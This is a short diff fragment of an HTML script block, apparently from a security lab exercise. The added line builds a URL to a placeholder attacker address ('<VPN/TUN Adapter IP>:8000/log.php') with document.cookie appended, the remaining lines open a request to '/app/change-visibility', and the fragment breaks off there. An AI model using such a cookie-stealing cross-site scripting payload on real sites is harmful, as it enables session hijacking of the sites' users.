@@ -1,4 +1,5 @@
 <script>
+'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/app/change-visibility',true);
